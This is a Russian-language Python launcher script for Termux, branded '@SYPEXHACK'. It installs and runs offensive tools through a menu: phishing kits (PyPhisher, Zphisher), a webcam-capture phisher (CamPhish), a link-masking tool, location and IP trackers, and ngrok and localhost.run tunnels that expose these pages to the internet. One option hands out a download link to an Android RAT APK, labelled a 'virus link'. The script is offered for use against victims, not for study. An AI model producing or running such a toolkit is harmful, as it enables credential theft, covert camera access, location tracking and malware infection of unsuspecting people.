import os, time, webbrowser

from colorama import Fore, Style

os.system('clear')

def res():
    print(Style.RESET_ALL)

def baner():
    print(Fore.CYAN+'', Style.BRIGHT)
    print('')
    print("  ___                 _             _   _               ")
    print(" |_ _|  _ __    ___  | |_    __ _  | | | |   ___   _ __ ")
    print("  | |  | '_ \  / __| | __|  / _` | | | | |  / _ \ | '__|")
    print("  | |  | | | | \__ \ | |_  | (_| | | | | | |  __/ | |   ")
    print(" |___| |_| |_| |___/  \__|  \__,_| |_| |_|  \___| |_|   ")
    res()
    
while True:
    baner()
    print(Style.BRIGHT, Fore.CYAN+"[Telegram: @SYPEXHACK]                         [v2.8.0]")
    res()
    print(Fore.GREEN+"    [1] Ngrok      >>  Тунелирование")
    print(Fore.GREEN+"    [2] Localhost  >>  Тунелирование")
    print(Fore.GREEN+"    [3] PyPhiser   >>  Фишинг")
    print(Fore.GREEN+"    [4] Zphisher   >>  Фишинг")
    print(Fore.GREEN+"    [5] CamPhish   >>  Взлом веб-камеры")
    print(Fore.GREEN+"    [6] Android    >>  Вирус ссылка")
    print(Fore.GREEN+"    [7] Maskphish  >>  Замаскировать ссылку")
    print(Fore.GREEN+"    [8] IP-Tracer  >>  Пробив по IP")
    print(Fore.GREEN+"    [9] Seeker     >>  Узнать местоположения")
    print(Fore.CYAN+"")
    print(Fore.YELLOW+"    [s] Настройки")
    print(Fore.YELLOW+"    [e] Выход")
    res()
    inp = input('  Выбери пункт>>> ')
    os.system('clear')

    
        
    if inp == '1':
        os.system('clear')
        baner()
        print('\n'' ['+Fore.RED+'ВНИМАНИЕ'+Fore.WHITE+'] ВКЛЮЧИТЕ ТОЧКУ ДОСТУПА И МОБИЛЬНЫЙ ИНТЕРНЕТ')
        res()
        tru_101 = input('  Включили? [y/n] >>> ')
        os.system('clear')
        if tru_101 == 'y':
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Ngrok...")
            res()
            os.system('pkg install nodejs-lts -y')
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Ngrok...")
            res()
            os.system('npm install ngrok')
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Ngrok...")
            res()
            os.system('npm install ngrok -g')
            we  = '8080'
            os.system('clear')
            baner()
            res()
            print(Fore.GREEN+'  Стандартный порт ['+Fore.YELLOW+'8080'+Fore.GREEN+']')
            res()
            tru_102 = input('  Изменить порт? [y/n] >>> ')
            if tru_102 == 'y':
                os.system('clear')
                baner()
                res()
                we_2 = input('  Введите порт>>> ')
                if we_2 == '':
                    os.system('clear')
                    baner()
                    res()
                    print(Fore.YELLOW+' Вы ничего не ввели!')
                    res()
                    print(Fore.CYAN+' Использую стандартный порт ['+Fore.YELLOW+'8080'+Fore.CYAN+']')
                    time.sleep(7)
                    os.system('clear')
                    print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                    time.sleep(2)
                    os.system('ngrok http '+we+' && clear')
                    os.system('clear')
                    
                else:
                    os.system('clear')
                    print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                    time.sleep(2)
                    os.system('ngrok http '+we_2+' && clear')
                    os.system('clear')

            if tru_102 == 'n':
                os.system('clear')
                print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                time.sleep(2)
                os.system('clear')
                os.system('ngrok http '+we+' && clear')
                os.system('clear')
                
            else:
                os.system('clear')

    
    if inp == '2':
        os.system('clear')
        print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Localhost...")
        res()
        time.sleep(1.5)
        os.system('clear')
        print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка dropbear...")
        res()
        os.system('pkg install dropbear -y')
        os.system('clear')
        print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка openssh...")
        res()
        os.system('pkg install openssh -y')
        qw  = '8080'
        os.system('clear')
        baner()
        res()
        print(Fore.GREEN+' Стандартный порт ['+Fore.YELLOW+'8080'+Fore.GREEN+']')
        res()
        tru_202 = input('  Изменить порт? [y/n] >>> ')
        if tru_202 == 'y':
            os.system('clear')
            baner()
            res()
            qw_2 = input('  Введите порт>>> ')
            if qw_2 == '':
                os.system('clear')
                print('\n')
                print(Fore.YELLOW+' Вы ничего не ввели!')
                res()
                print(Fore.CYAN+' Использую стандартный порт ['+Fore.YELLOW+'8080'+Fore.CYAN+']')
                time.sleep(7)
                os.system('clear')
                print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                time.sleep(2)
                os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run && clear')
                os.system('clear')
                
            else:
                os.system('clear')
                print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
                time.sleep(2)
                os.system('ssh -R 80:localhost:'+qw_2+' nokey@localhost.run && clear')
                os.system('clear')

        if tru_202 == 'n':
            os.system('clear')
            print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Запуск..."+Fore.WHITE+"")
            time.sleep(2)
            os.system('clear')
            os.system('ssh -R 80:localhost:'+qw+' nokey@localhost.run && clear')
            os.system('clear')
            
        else:
            os.system('clear')

    

    if inp == '3':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка PyPhiser...")
        res()
        time.sleep(1.5)
        os.system('git clone https://github.com/KasRoudra/PyPhisher')
        os.chdir('PyPhisher')
        os.system('clear')
        os.system('python3 pyphisher.py')
        tsu_302 = input('\n [Нажмите enter чтобы выйти]')
        os.chdir('/data/data/com.termux/files/home/installer')
        os.system('clear')

    

    if inp == '4':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Zphiser...")
        res()
        time.sleep(1.5)
        os.system('git clone https://github.com/htr-tech/zphisher')
        os.chdir('zphisher')
        os.system('clear')
        os.system('bash zphisher.sh')
        tsu_401 = input('\n [Нажмите enter чтобы выйти]')
        os.chdir('/data/data/com.termux/files/home/installer')
        os.system('clear')
    


    if inp == '5':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка CamPhish...")
        res()
        time.sleep(1.5)
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка php...")
        res()
        os.system('pkg install php -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка openssh...")
        res()
        os.system('pkg install openssh -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка CamPhish...")
        res()
        os.system('git clone https://github.com/techchipnet/CamPhish')
        os.chdir('CamPhish')
        os.system('clear')
        os.system('bash camphish.sh')
        tsu_501 = input('\n [Нажмите enter чтобы выйти]')
        os.chdir('/data/data/com.termux/files/home/installer')
        os.system('clear')

    
    
    if inp == '6':
        os.system('clear')
        baner()
        res()
        print(Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Получаем ссылку...")
        res()
        time.sleep(3)
        os.system('clear')
        print(Fore.CYAN+' Ваша ссылка''\n')
        res()
        print(Fore.GREEN+' https://github.com/LOoLzeC/vcrt/raw/master/dendroid.apk')
        res()
        tru_601 = input('\n [Нажмите enter чтобы выйти]')
        os.system('clear')

    

    if inp == '7':
        os.system('cd maskphish')
        filename = "maskphish.sh"
        
        if os.path.exists(filename):
            
            print(f"{filename} существует в текущем каталоге.")
            time.sleep(1.5)
            
            os.chdir('maskphish')
            os.system('bash maskphish.sh')
            tsu_701 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')
        
        else:
            print(f"{filename} не существует в текущем каталоге.")
            time.sleep(1.5)

            print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Maskphish...")
            res()
            os.system('git clone https://github.com/jaykali/maskphish.git')
            os.system('clear')
            os.chdir('maskphish')
            os.system('bash maskphish.sh')
            tsu_701 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')


    
    if inp == '8':
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка IP-Tracer...")
        res()
        time.sleep(1.5)
        os.system('rm -fr IP-Tracer')
        os.system('git clone https://github.com/rajkumardusad/IP-Tracer.git')
        os.chdir('IP-Tracer')
        os.system('bash ./install')
        os.system('clear')
        baner()
        print(Fore.GREEN+"\n")
        print('    [1] Пробить свой IP')
        print('    [2] Пробить чужой IP')
        print(Fore.YELLOW+'')
        print('    [e] выход')
        res()
        tru_801 = input('  Выбери пункт>>> ')

        if tru_801 == '1':
            os.system('clear')
            os.system('trace -m')
            tsu_803 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')
            
        if tru_801 == '2':
            os.system('clear')
            baner()
            res()
            print(Fore.YELLOW+'    Пример IP'+Fore.CYAN+' 33.73.133.137')
            res()
            tsu_802 = input('  Введите IP >>> ')
            os.system('clear')
            os.system('trace -t '+tsu_802)
            tsu_804 = input('\n [Нажмите enter чтобы выйти]')
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')

        else:
            os.chdir('/data/data/com.termux/files/home/installer')
            os.system('clear')

    

    if inp == '9':
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
        res()
        time.sleep(1.5)
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка dropbear...")
        res()
        os.system('pkg install dropbear -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка openssh...")
        res()
        os.system('pkg install openssh -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка php...")
        res()
        os.system('pkg install php -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка php7...")
        res()
        os.system('pkg install php7 -y')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
        res()
        os.system('git clone https://github.com/thewhiteh4t/seeker.git')
        os.chdir('seeker')
        os.system('clear')
        print (Fore.YELLOW+"["+Fore.RED+"~"+Fore.YELLOW+"] Установка Seeker...")
        res()
        os.system('chmod 777 install.sh')
        os.system('./install.sh')
        os.system('clear')
        os.system('python seeker.py')
        tsu_901 = input('\n [Нажмите enter чтобы выйти]')
        os.chdir('/data/data/com.termux/files/home/installer')
        os.system('clear')
    

    
    if inp == 's':
        os.system('cd /data/data/com.termux/files/home/installer/')
        os.system('python set.py')

    

    if inp == 'e':
        os.system('clear')
        print('\n')
        print(Fore.CYAN+'Спасибо за использование Installer')
        res()
        break
